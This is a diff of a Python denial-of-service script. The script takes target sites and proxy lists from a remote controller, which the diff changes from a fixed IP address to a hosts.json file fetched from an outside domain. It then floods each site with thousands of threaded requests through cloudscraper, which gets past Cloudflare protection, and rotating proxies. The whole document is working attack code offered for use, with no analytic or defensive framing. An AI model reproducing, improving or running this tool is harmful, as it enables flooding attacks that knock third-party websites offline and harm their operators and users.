@@ -1,7 +1,6 @@
 import cloudscraper
 import requests
 from bs4 import BeautifulSoup
-# from ctypes import windll
 from urllib.parse import unquote
 from gc import collect
 from loguru import logger
@@ -15,10 +14,13 @@ from urllib3 import disable_warnings
 from pyuseragents import random as random_useragent
 from json import loads
 
-HOSTS = ["http://46.4.63.238/api.php"]
+try:
+    HOSTS = loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
+except:
+    sleep(5)
+    HOSTS = loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
 MAX_REQUESTS = 5000
 disable_warnings()
-def clear(): return system('cls')
 logger.remove()
 logger.add(stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
 threads = int(input('Кількість потоків: '))
@@ -43,7 +45,9 @@ def mainth():
             attack = scraper.get(site)
             if attack.status_code >= 302 and attack.status_code >= 200:
                 for proxy in data['proxy']:
-                    scraper.proxies.update({'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
+                    auth = proxy["auth"]
+                    ip = proxy["ip"]
+                    scraper.proxies.update({'http': ip + "://" +auth, 'https': ip + "://" + auth})
                     response = scraper.get(site)
                     if response.status_code >= 200 and response.status_code <= 302:
                         for i in range(MAX_REQUESTS):
@@ -61,11 +65,9 @@ def mainth():
 def cleaner():
     while True:
         sleep(60)
-        clear()
         collect()
 
 if __name__ == '__main__':
-    clear()
     for _ in range(threads):
         Thread(target=mainth).start()
 
